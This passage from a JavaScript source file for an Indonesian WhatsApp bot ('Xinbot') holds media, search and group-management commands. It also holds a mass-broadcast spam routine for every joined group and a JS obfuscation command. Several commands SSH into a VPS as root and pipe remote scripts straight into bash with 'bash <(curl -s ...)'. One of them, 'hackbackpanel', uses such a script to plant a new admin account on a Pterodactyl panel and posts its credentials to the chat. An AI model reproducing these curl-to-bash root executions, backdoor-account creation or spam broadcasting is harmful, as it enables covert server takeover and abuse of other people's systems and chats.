        return xin.sendMessage(m.chat, {audio: buffer, mimetype: "audio/mpeg", ptt: true}, {quoted: m})
    } 
}
break
 case 'dec': case 'decrypt': {
const { webcrack } = await import('webcrack');
const usage = `Contoh:
${command} (Input text or reply text to dec code)
${command} doc (Reply to a document)`;

if (!isPrem) return ReplyX('Khusus Premium');

let text;
if (args.length >= 1) {
text = args.join(" ");
} else if (m.quoted && m.quoted.text) {
text = m.quoted.text;
} else {
return ReplyX(usage);
}

try {
let message;
if (text === 'doc' && m.quoted && m.quoted.mtype === 'documentMessage') {
let docBuffer;
if (m.quoted.mimetype) {
docBuffer = await m.quoted.download();
}
message = await webcrack(docBuffer.toString('utf-8'));
} else {
message = await webcrack(text);
}

const filePath = './@sampah_decrypt_xinbot';
fs.writeFileSync(filePath, message.code);
await xin.sendMessage(m.chat, {
document: {
url: filePath
},
mimetype: 'application/javascript',
fileName: 'Dec By © Xinbot'
}, {quoted: m});

} catch (error) {
const errorMessage = `Terjadi kesalahan: ${error.message}`;
await ReplyX(errorMessage);
}
}
break

case 'encrypt': {
if (!m.quoted) return ReplyX("Reply file .js")
if (mime !== "application/javascript") return ReplyX("Reply file .js")
let media = await m.quoted.download()
let filename = m.quoted.fileName
await fs.writeFileSync(`./@enc${filename}.js`, media)
await m.reply("Memproses encrypt code . . .")
await JsConfuser.obfuscate(await fs.readFileSync(`./@enc${filename}.js`).toString(), {
  target: "node",
  preset: "high",
  calculator: true,
  compact: true,
  hexadecimalNumbers: true,
  controlFlowFlattening: 0.75,
  deadCode: 0.2,
  dispatcher: true,
  duplicateLiteralsRemoval: 0.75,
  flatten: true,
  globalConcealing: true,
  identifierGenerator: "randomized",
  minify: true,
  movedDeclarations: true,
  objectExtraction: true,
  opaquePredicates: 0.75,
  renameVariables: true,
  renameGlobals: true,
  shuffle: { hash: 0.5, true: 0.5 },
  stack: true,
  stringConcealing: true,
  stringCompression: true,
  stringEncoding: true,
  stringSplitting: 0.75,
  rgf: false
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./@enc${filename}.js`, obfuscated)
  await xin.sendMessage(m.chat, {document: fs.readFileSync(`./@enc${filename}.js`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt File Sukses!"}, {quoted: m})
}).catch(e => m.reply("Error :" + e))
}
break

case 'encrypthard': {
if (!m.quoted) return ReplyX("Reply file .js")
if (mime !== "application/javascript") return reply("Reply file .js")
let media = await m.quoted.download()
let filename = m.quoted.fileName
await fs.writeFileSync(`./@hardenc${filename}.js`, media)
await ReplyX("Memproses encrypt hard code . . .")
await JsConfuser.obfuscate(await fs.readFileSync(`./@hardenc${filename}.js`).toString(), {
  target: "node",
    preset: "high",
    compact: true,
    minify: true,
    flatten: true,

    identifierGenerator: function() {
        const originalString = 
            "/*t.me/htmlxin/*^/*($break)*/" + 
            "/*t.me/htmlxin/*^/*($break)*/";

        function hapusKarakterTidakDiinginkan(input) {
            return input.replace(
                /[^a-zA-Z/*ᨒZenn/*^/*($break)*/]/g, ''
            );
        }

        function stringAcak(panjang) {
            let hasil = '';
            const karakter = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz';
            const panjangKarakter = karakter.length;

            for (let i = 0; i < panjang; i++) {
                hasil += karakter.charAt(
                    Math.floor(Math.random() * panjangKarakter)
                );
            }
            return hasil;
        }

        return hapusKarakterTidakDiinginkan(originalString) + stringAcak(2);
    },

    renameVariables: true,
    renameGlobals: true,

    // Kurangi encoding dan pemisahan string untuk mengoptimalkan ukuran
    stringEncoding: 0.01, 
    stringSplitting: 0.1, 
    stringConcealing: true,
    stringCompression: true,
    duplicateLiteralsRemoval: true,

    shuffle: {
        hash: false,
        true: false
    },

    stack: false,
    controlFlowFlattening: false, 
    opaquePredicates: false, 
    deadCode: false, 
    dispatcher: false,
    rgf: false,
    calculator: false,
    hexadecimalNumbers: false,
    movedDeclarations: true,
    objectExtraction: true,
    globalConcealing: true
}).then(async (obfuscated) => {
  await fs.writeFileSync(`./@hardenc${filename}.js`, obfuscated)
  await xin.sendMessage(m.chat, {document: fs.readFileSync(`./@hardenc${filename}.js`), mimetype: "application/javascript", fileName: filename, caption: "Encrypt File JS Sukses! Type:\nString"}, {quoted: m})
}).catch(e => m.reply("Error :" + e))
}
break

case 'qc': {
const quoteApi = require('@neoxr/quote-api')
const { Sticker } = require('wa-sticker-formatter')
        if (!text) m.reply(`Example: ${prefix + command} halo`);
        let avatar = await xin.profilePictureUrl(m.sender, 'image').catch(_ => 'https://i.ibb.co/2WzLyGk/profile.jpg')

const json = {
  "type": "quote",
  "format": "png",
  "backgroundColor": "#2E4053",
  "width": 512,
  "height": 768,
  "scale": 2,
  "messages": [
    {
      "entities": [],
      "avatar": true,
      "from": {
        "id": 1,
        "name": pushname,
        "photo": {
          "url": avatar
        }
      },
      "text": text,
      "replyMessage": {}
    }
  ]
}

async function createSticker(req, url, packName, authorName, quality) {
  let stickerMetadata = {
    type: 'full',
    pack: packName,
    author: authorName,
    quality
  }
  return (new Sticker(req ? req : url, stickerMetadata)).toBuffer()
}

const res = await quoteApi(json)
const buffer = Buffer.from(res.image, 'base64')
      let stiker = await createSticker(buffer, false, "Hann", "Hann")
      xin.sendFile(m.chat, stiker, 'sticker.webp', '', m)
  }
  break
 case "shortlink": case "shorturl": {
if (!text) return ReplyX(".shortlink https://example.com")
if (!isUrl(text)) return ReplyX(".shortlink https://example.com")
var res = await axios.get('https://tinyurl.com/api-create.php?url='+encodeURIComponent(text))
var link = `
* *Shortlink by tinyurl.com*
${res.data.toString()}
`
return m.reply(link)
}
break
case 'upch': {
if (!isPrem) return ReplyX("Khusus Prem")
let media = await quoted.download()
if (args[0] === 'audio') {
await xin.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
await xin.sendMessage("120363333509194874@newsletter", { audio: media, mimetype: 'audio/mp4', ptt: true, fileLength: 88738}, { quoted: m })
await xin.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})
} else if (args[0] === 'image') {
await xin.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
await xin.sendMessage("120363333509194874@newsletter", { image: media})
await xin.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})
} else if (args[0] === 'video') {
await xin.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}})
await xin.sendMessage("120363333509194874@newsletter", { video: media})
await xin.sendMessage(m.chat, { react: { text: "☑️",key: m.key,}})
} else {
m.reply('Rusak Cik 🗿')
}
}
break
  case "cekidch": {
if (!text) return ReplyX("linkchnya")
if (!text.includes("https://whatsapp.com/channel/")) return ReplyX("Link tautan tidak valid")
let result = text.split('https://whatsapp.com/channel/')[1]
let res = await xin.newsletterMetadata("invite", result)
let teks = `
* *ID :* ${res.id}
* *Nama :* ${res.name}
* *Total Pengikut :* ${res.subscribers}
* *Status :* ${res.state}
* *Verified :* ${res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"}
`
return m.reply(teks)
}
break
 // End Tools Menu , Start Search & Play Menu //
 case 'playspotify': {
				if (!text) return m.reply(`*Masukan Judul Lagu!*\n\nContoh :\n${prefix + command} Juice Wrld`)
				try {
					let anu = await searchSpotifyTracks(text)
					let anuu = anu[0]
					let spotify = await spotifyDl(anuu.external_urls.spotify)
					await xin.sendMessage(m.chat, {
						audio: {
							url: spotify.result.music
						},
						mimetype: 'audio/mpeg',
						contextInfo: {
							forwardingScore: 9999999,
							isForwarded: true,
							externalAdReply: {
								title: "乂 Spotify - Player",
								body: `${spotify.result.author} - ${spotify.result.title} © Xinbot`,
								mediaType: 1,
								previewType: 0,
								renderLargerThumbnail: true,
								thumbnailUrl: spotify.result.thumb,
								sourceUrl: anuu.external_urls.spotify
							}
						}
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
			
				case 'ytsearch': {
				if (!text) return ReplyX(`Contoh : ${prefix + command} Review SC Xinbot`)
				try {
					let search = await ytdl.search(text)
					let uii = await search.results
					let teks = '*Hasil YouTube Search*\n\n'
					let no = 1
					for (let i of uii.filter(objek => objek.type === "video")) {
						teks += `*⌬ Nomor:* ${no++}\n*⌬ Type:* ${i.type}\n*⌬ Video ID:* ${i.videoId}\n*⌬ Title:* ${i.title}\n*⌬ View:* ${i.views}\n*⌬ Duration:* ${i.timestamp}\n*⌬ Upload At:* ${i.ago}\n*⌬ Links:* ${i.url}\n─────────────────\n`
					}
					xin.endMessage(m.chat, {
						image: {
							url: uii[0].thumbnail
						},
						caption: teks
					}, {
						quoted: m
					})
			        } catch (err) {
			            console.log(err);
				}
			}
			break
			
 case 'ttsearch': {
				if (!text) return ReplyX(`*Masukan Query*:\n\nContoh:\n${prefix+command} jj epep`)
				await xin.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				try {
					let tiktoks = await tiktokSearchVideo(text)
					let teks = "*</> TIKTOK SEARCH </>*\n\n"
					let no = 1
					for (let i of tiktoks.videos) {
						let sut = await JSON.stringify(i.author)
						teks += `*Video Info* :
- Nomor : ${no++}
- Username : ${i.author.unique_id}
- Nickname : ${i.author.nickname}
- Duration : ${i.duration} detik

*Statistik Info* :
- Views : ${i.play_count}
- Likes : ${i.digg_count}
- Comment : ${i.comment_count}
- Share : ${i.share_count}

*Caption* :
${i.title}

*Links Video* :
https://www.tiktok.com/@${i.author.unique_id}/video/${i.video_id}

─────────────────
`
					}
					xin.sendMessage(m.chat, {
						video: {
							url: `https://tikwm.com${tiktoks.videos[0].play}`
						},
						caption: teks
					}, {
						quoted: m
					})
				} catch (error) {
					await m.errorReport(util.format(error), command)
				}
			}
			break
 case "pin": case "pinterest": {
if (!text) return ReplyX("Example usage:\nSunset backgrohnd")
await xin.sendMessage(m.chat, {react: {text: '🔎', key: m.key}})
let pin = await pinterest2(text)
if (pin.length > 10) await pin.splice(0, 11)
const txts = text
let araara = new Array()
let urutan = 0
for (let a of pin) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.images_url}`}}, { upload: xin.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.images_url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: `\nBerikut adalah foto hasil pencarian dari *pinterest*`
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await xin.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
await xin.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break

 			case 'ytmp3': {
				if (!text) return ReplyX(`*Penggunaan salah!*\n\nContoh:\n${prefix + command} linknya`)
				if (!text.match('youtu')) return ReplyX('Link Kamu Salah!')
				await xin.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				YouTubeMp3(args[0], args[1])
			}
			break
case 'ytmp4': {
				if (!text) return ReplyX(`*Penggunaan salah!*\n\nContoh:\n${prefix + command} linknya`)
				if (!text.match('youtu')) return ReplyX('Link Tidak Terdeteksi\n🖕🏽!')
				await xin.sendMessage(m.chat, {
					react: {
						text: "⏱️",
						key: m.key,
					}
				})
				YouTubeMp4(args[0], args[1])
			}
			break

case 'play': {
if (!text) return ReplyX(`Contoh: ${prefix + command} sephia`);
ReplyX("Proses!");
try {
async function getBuffer(url) {
const res = await axios({
method: 'get',
url,
responseType: 'arraybuffer'
});
return res.data;
}
const look = await search(text);
const convert = look.videos[0];
if (!convert) return m.reply('Audio Tidak Ditemukan');
if (convert.seconds >= 3600) {
return reply('Audio is longer than 1 hour!');
}
let audioUrl;
try {
audioUrl = await youtube(convert.url);
} catch (e) {
ReplyX("Retrying...");
audioUrl = await youtube(convert.url);
}
const thumbBuffer = await getBuffer(convert.thumbnail);
await xin.sendMessage(m.chat, {
audio: {
url: audioUrl.mp3
},
mimetype: 'audio/mpeg',
}, {
quoted: m
});
} catch (e) {
ReplyX(`*Error:* ${e.message}`);
}
};
break;
// End, Start Group Menu //

      case "listgc": {
let gcall = Object.values(await xin.groupFetchAllParticipating().catch(_=> null))
let listgc = '\n'
await gcall.forEach((u, i) => {
listgc += `*${i+1}.* ${u.subject}\n* *ID :* ${u.id}\n* *Total Member :* ${u.participants.length} Member\n* *Status Grup :* ${u.announce == true ? "Tertutup" : "Terbuka"}\n* *Pembuat :* ${u.owner ? u.owner.split('@')[0] : 'Sudah keluar'}\n\n`
})
xin.sendMessage(m.chat, {text: `${listgc}`, contextInfo: {mentionedJid: [m.sender], externalAdReply: {
thumbnail: B1, title: `[ ${gcall.length} Group Chat ] `, body: `Runtime : ${runtime(process.uptime())}`,  sourceUrl: global.url2, previewType: "PHOTO"}}}, {quoted: qpayment})
}
break
case "resetlinkgc": {
if (!isOwner) return m.reply("Khusus Owner\n Beli Script Di wa.me/+6281937707120 atau di\n t.me/htmlxin")
if (!isOwner && !isAdmins) return ReplyX("Khusus Admin")
if (!isBotAdmins) return ReplyX("Khusus Admin")
await xin.groupRevokeInvite(m.chat)
m.reply("Berhasil mereset link grup ✅")
}
break
case "linkgc": {
if (!isOwner) return ReplyX("Khusus Owner\n Beli Script Di wa.me/+6281937707120 atau di\n t.me/htmlxin")
if (!isOwner && !isAdmins) return ReplyX("Khusus Admin")
if (!isBotAdmins) return ReplyX("Khusus Admin")
const urlGrup = "https://chat.whatsapp.com/" + await xin.groupInviteCode(m.chat)
var teks = `
${urlGrup}
`
await xin.sendMessage(m.chat, {text: teks, matchedText: `${urlGrup}`}, {quoted: m})
}
break
case "hidetag": {
if (!isOwner) return ReplyX("Khusus Owner\n Beli Script Di wa.me/+6281937707120 atau di\n t.me/htmlxin")
if (!text) return ReplyX("Mana Teks Nya?")
var teks = m.quoted ? m.quoted.text : text
var member = await groupMetadata.participants.map(e => e.id)
xin.sendMessage(m.chat, {text: teks, mentions: [...member]})
}
break
case "add": {
if (!m.isGroup) return ReplyX("Khusus Dalam Grup")
if (!isOwner && !isAdmins) return ReplyX("Khusus Admin")
if (!isBotAdmins) return ReplyX("Khusus Admin")
if (text) {
const input = text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await xin.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await xin.groupParticipantsUpdate(m.chat, [input], 'add')
if (Object.keys(res).length == 0) {
return m.reply(`Berhasil Menambahkan ${input.split("@")[0]} Kedalam Grup Ini`)
} else {
return m.reply(JSON.stringify(res, null, 2))
}} else {
return ReplyX("Usage:\n .add 62xx")
}
}
break

case "kick": case "kik": {
if (!m.isGroup) return ReplyX("Khusus Dalam Grup")
if (!isOwner && !isAdmins) return ReplyX("Khusus Admin")
if (!isBotAdmins) return ReplyX("Khusus Admin")
if (text || m.quoted) {
const input = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text ? text.replace(/[^0-9]/g, "") + "@s.whatsapp.net" : false
var onWa = await xin.onWhatsApp(input.split("@")[0])
if (onWa.length < 1) return m.reply("Nomor tidak terdaftar di whatsapp")
const res = await xin.groupParticipantsUpdate(m.chat, [input], 'remove')
await m.reply(`Berhasil mengeluarkan ${input.split("@")[0]} dari grup ini`)
} else {
return ReplyX("Usage:\n Tag Or Reply")
}
}
break


case "leave": {
if (!isOwner) return ReplyX("Khusus Owner\nBeli Script Di wa.me/6281937707120 atau\nt.me/htmlxin")
if (!m.isGroup) return ReplyX("Khusus Dalam Grup")
await m.reply("Sayonara !")
await sleep(4000)
await xin.groupLeave(m.chat)
}
break
case "jpm": {
if (!isOwner) return ReplyX(`Khusus Owner\nBeli Script Di wa.me/6281937707120 atau\nt.me/htmlxin`)
if (!q) return m.reply("Mana TeksNya?")
let allgrup = await xin.groupFetchAllParticipating()
let res = await Object.keys(allgrup)
let count = 0
const jid = m.chat
const teks = text
await m.reply(`Memproses *jpm* teks Ke ${res.length} grup`)
for (let i of res) {

try {
await xin.sendMessage(i, {text: `${teks}`}, {quoted: qjpm})
count += 1
} catch {}
await sleep(700)
}
await xin.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break
case "jpmhidetag": {
if (!isOwner) return ReplyX("Khusus Owner\nBeli Script Di wa.me/6281937707120 atau\nt.me/htmlxin")
if (!text && !m.quoted) return m.reply("Mana Teksnya?")
var texs = m.quoted ? m.quoted.text : text
let getGroups = await xin.groupFetchAllParticipating()
let groups = await Object.keys(getGroups)
let total = 0
const jid = m.chat
let par
m.reply(`Memproses Mengirim Pesan *Text* Ke *${groups.length}* Grup`)
for (let i of groups) {
try {
par = await getGroups[i].participants.map(e => e.id)
await xin.sendMessage(i, {text: texs, contextInfo: {
mentionedJid: par
}}, {quoted: qbugz})
total += 1
} catch (e) {
console.log(e)
}
await sleep(500)
}
m.reply(`Berhasil Mengirim Pesan Ke *${total} Grup*`)
}
break
case "jpmtesti": {
if (!isOwner) return ReplyX(`Khusus Owner\nBeli Script Di wa.me/6281937707120 atau\nt.me/htmlxin`)
if (!q) return m.reply("Mana Testi Fotonya")
if (!/image/.test(mime)) return m.reply("Mana FotoNya?")
const allgrup = await xin.groupFetchAllParticipating()
const res = await Object.keys(allgrup)
let count = 0
const teks = text
const jid = m.chat
const rest = await xin.downloadAndSaveMediaMessage(qmsg)
await m.reply(`Memproses *jpm* testimoni Ke ${res.length} grup`)
for (let i of res) {

try {
await xin.sendMessage(i, {image: await fs.readFileSync(rest), caption: teks, contextInfo: { isForwarded: true, mentionedJid: [m.sender], businessMessageForwardInfo: { businessOwnerJid: global.owner+"@s.whatsapp.net" }, forwardedNewsletterMessageInfo: { newsletterName: global.namaSaluran, newsletterJid: global.idSaluran }}}, {quoted: qjpm})
count += 1
} catch {}
await sleep(700)
}
await fs.unlinkSync(rest)
await xin.sendMessage(jid, {text: `*Jpm Telah Selsai ✅*\nTotal grup yang berhasil dikirim pesan : ${count}`}, {quoted: m})
}
break
case 'mediafire': {
    async function mediafiredll(url) {
        const res = await axios.get(`https://www-mediafire-com.translate.goog/${url.replace('https://www.mediafire.com/', '')}?_x_tr_sl=en&_x_tr_tl=fr&_x_tr_hl=en&_x_tr_pto=wapp`);
        const $ = cheerio.load(res.data);
        
        const fileurl = $('#downloadButton').attr('href');
        const filename = $('body > main > div.content > div.center > div > div.dl-btn-cont > div.dl-btn-labelWrap > div.promoDownloadName.notranslate > div')
            .attr('title')
            .replaceAll(' ', '')
            .replaceAll('\n', '');
        
        const date = $('body > main > div.content > div.center > div > div.dl-info > ul > li:nth-child(2) > span').text();
        const filesize = $('#downloadButton').text()
            .replace('Download', '')
            .replace('(', '')
            .replace(')', '')
            .replace('\n', '')
            .replace('\n', '')
            .replace('                         ', '')
            .replaceAll(' ', '');
        
        let filetype = '';
        let rese = await axios.head(link);
        filetype = rese.headers['content-type'];

        return { filename, filesize, date, filetype, fileurl };
    }

    let input = `*Example*: ${prefix + command} https://www.mediafire.com/xxxxxxx*`;
    
    if (!text) return m.reply(input);
    
    const dataJson = await mediafiredll(text);
    const { filename, filesize, date, filetype, fileurl } = dataJson
    if (filesize.split('MB')[0] >= 100) {
        return m.reply('*Ih gede banget size nya, gak mao ah😠*');
    }

    await sleep(500);
    
    const caption = `≡ *MEDIAFIRE*

▢ *Name* : ${filename}
▢ *Size* : ${filesize}
▢ *Type* : ${filetype}
▢ *UploadAt*: ${date}`;

     xin.sendMessage(m.chat, { document : { url : fileurl}, fileName : filename, caption: caption, mimetype: filetype }, { quoted : m });
}
break
case "tt": case "tiktok": {
if (!text) return ReplyX("url")
if (!text.startsWith("https://")) return ReplyX("url")
await tiktokDl(q).then(async (result) => {
await xin.sendMessage(m.chat, {react: {text: '⌛', key: m.key}})
if (!result.status) return m.reply("Error!")
if (result.durations == 0 && result.duration == "0 Seconds") {
let araara = new Array()
let urutan = 0
for (let a of result.data) {
let imgsc = await prepareWAMessageMedia({ image: {url: `${a.url}`}}, { upload: xin.waUploadToServer })
await araara.push({
header: proto.Message.InteractiveMessage.Header.fromObject({
title: `Foto Slide Ke *${urutan += 1}*`, 
hasMediaAttachment: true,
...imgsc
}),
nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.fromObject({
buttons: [{                  
"name": "cta_url",
"buttonParamsJson": `{\"display_text\":\"Link Tautan Foto\",\"url\":\"${a.url}\",\"merchant_url\":\"https://www.google.com\"}`
}]
})
})
}
const msgii = await generateWAMessageFromContent(m.chat, {
viewOnceMessageV2Extension: {
message: {
messageContextInfo: {
deviceListMetadata: {},
deviceListMetadataVersion: 2
}, interactiveMessage: proto.Message.InteractiveMessage.fromObject({
body: proto.Message.InteractiveMessage.Body.fromObject({
text: "*Here is Your Requested TikTok Video \n © Xinbot*"
}),
carouselMessage: proto.Message.InteractiveMessage.CarouselMessage.fromObject({
cards: araara
})
})}
}}, {userJid: m.sender, quoted: m})
await xin.relayMessage(m.chat, msgii.message, { 
messageId: msgii.key.id 
})
} else {
let urlVid = await result.data.find(e => e.type == "nowatermark_hd" || e.type == "nowatermark")
await xin.sendMessage(m.chat, {video: {url: urlVid.url}, mimetype: 'video/mp4', caption: `*Here is Your Requested TikTok Video \n © Xinbot*`}, {quoted: m})
}
}).catch(e => console.log(e))
await xin.sendMessage(m.chat, {react: {text: '', key: m.key}})
}
break
case "installtemastellar": case "installtemastelar": {
if (!isOwner) return ReplyX(` Khusus Owner\nBeli Script Di wa.me/6281937707120 atau\nt.me/htmlxin `)
if (!text || !text.split("|")) return ReplyX("ipvps|pwvps")
let vii = text.split("|")
if (vii.length < 2) return ReplyX("ipvps|pwvps")
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (!isOwner) return ReplyX(` Khusus Owner\nBeli Script Di wa.me/6281937707120 atau\nt.me/htmlxin `)
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/Zeroneoffc/Auto-installer-pterodactyl/main/install.sh)`
const ress = new Client();

ress.on('ready', async () => {
m.reply("Memproses install *tema stellar* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema stellar* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`zerone\n`) // Key Token : zerone
stream.write(`1\n`)
stream.write(`1\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break


case "installtemabilling": case "instaltemabiling": {
if (!isOwner) return ReplyX(` Khusus Owner\nBeli Script Di wa.me/6281937707120 atau\nt.me/htmlxin `)
if (!text || !text.split("|")) return ReplyX("ipvps|pwvps")
let vii = text.split("|")
if (vii.length < 2) return ReplyX("ipvps|pwvps")
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}
if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
m.reply("Memproses install *tema billing* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema billing* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`1\n`)
stream.write(`2\n`)
stream.write(`yes\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break

case "uninstalltema": {
if (!isOwner) return ReplyX("Khusus Owner")
if (!text || !text.split("|")) return ReplyX("ipvps|pwvps")
let vii = text.split("|")
if (vii.length < 2) return ReplyX("ipvps|pwvps")
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps
let pilihan = text

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

await m.reply("Memproses *uninstall* tema pterodactyl\nTunggu 1-10 menit hingga proses selsai")

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil *uninstall* tema pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`) // Key Token : skyzodev
stream.write(`2\n`)
stream.write(`y\n`)
stream.write(`x\n`)
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break
case "installtemaenigma": {
if (!isOwner) return ReplyX(` Khusus Owner\nBeli Script Di wa.me/6281937707120 atau\nt.me/htmlxin `)
if (!text || !text.split("|")) return ReplyX("ipvps|pwvps")
let vii = text.split("|")
if (vii.length < 2) return ReplyX("ipvps|pwvps")
global.installtema = {
vps: vii[0], 
pwvps: vii[1]
}

if (global.installtema == undefined) return m.reply("Ip / Password Vps Tidak Ditemukan")

let ipvps = global.installtema.vps
let passwd = global.installtema.pwvps

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
m.reply("Memproses install *tema enigma* pterodactyl\nTunggu 1-10 menit hingga proses selsai")
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
await m.reply("Berhasil install *tema enigma* pterodactyl ✅")
ress.end()
}).on('data', async (data) => {
console.log(data.toString())
stream.write(`skyzodev\n`); 
stream.write('1\n');
stream.write('3\n');
stream.write('https://wa.me/6281937707120\n');
stream.write('https://whatsapp.com/channel/0029VaYoztA47XeAhs447Y1s\n');
stream.write('https://chat.whatsapp.com/IP1KjO4OyM97ay2iEsSAFy\n');
stream.write('yes\n');
stream.write('x\n');
}).stderr.on('data', (data) => {
console.log('STDERR: ' + data)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break
case "hackbackpanel": {
if (!isOwner) return ReplyX("Khusus Owner\nBeli Script Di wa.me/6281937707120 atau\nt.me/htmlxin")
let t = text.split('|')
if (t.length < 2) return ReplyX("Usage:\n IpVPS|PwVPS")
let ipvps = t[0]
let passwd = t[1]

const newuser = "admin" + getRandom("")
const newpw = "admin" + getRandom("")

const connSettings = {
 host: ipvps,
 port: '22',
 username: 'root',
 password: passwd
}
    
const command = `bash <(curl -s https://raw.githubusercontent.com/SkyzoOffc/Pterodactyl-Theme-Autoinstaller/main/install.sh)`
const ress = new Client();

ress.on('ready', () => {
ress.exec(command, (err, stream) => {
if (err) throw err
stream.on('close', async (code, signal) => {    
let teks = `
*Hackback panel sukses ✅*

*Berikut detail akun admin panel :*
* *Username :* ${newuser}
* *Password :* ${newpw}
`
await xin.sendMessage(m.chat, {text: teks}, {quoted: m})
ress.end()
}).on('data', async (data) => {
await console.log(data.toString())
}).stderr.on('data', (data) => {
stream.write("skyzodev\n")
stream.write("7\n")
stream.write(`${newuser}\n`)
stream.write(`${newpw}\n`)
});
});
}).on('error', (err) => {
console.log('Connection Error: ' + err);
m.reply('Katasandi atau IP tidak valid');
}).connect(connSettings);
}
break
case "uninstallpanel": {
if (!isOwner) return m.reply(` Khusus Owner\nBeli Script Di wa.me/6281937707120 atau\nt.me/htmlxin `);
if (!text || !text.split("|")) return ReplyX("ipvps|pwvps")
var vpsnya = text.split("|")
if (vpsnya.length < 2) return ReplyX("ipvps|pwvps|domain")
let ipvps = vpsnya[0]
let passwd = vpsnya[1]
const connSettings = {
host: ipvps, port: '22', username: 'root', password: passwd
}
const boostmysql = `\n`
const command = `bash <(curl -s https://pterodactyl-installer.se)`
const ress = new Client();
ress.on('ready', async () => {

await m.reply("Memproses *uninstall* server panel\nTunggu 1-10 menit hingga proses selsai")

ress.exec(command, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await ress.exec(boostmysql, async (err, stream) => {
if (err) throw err;
stream.on('close', async (code, signal) => {
await m.reply("Berhasil *uninstall* server panel ✅")
}).on('data', async (data) => {
await console.log(data.toString())
if (data.toString().includes(`Remove all MariaDB databases? [yes/no]`)) {
await stream.write("\x09\n")
}
}).stderr.on('data', (data) => {
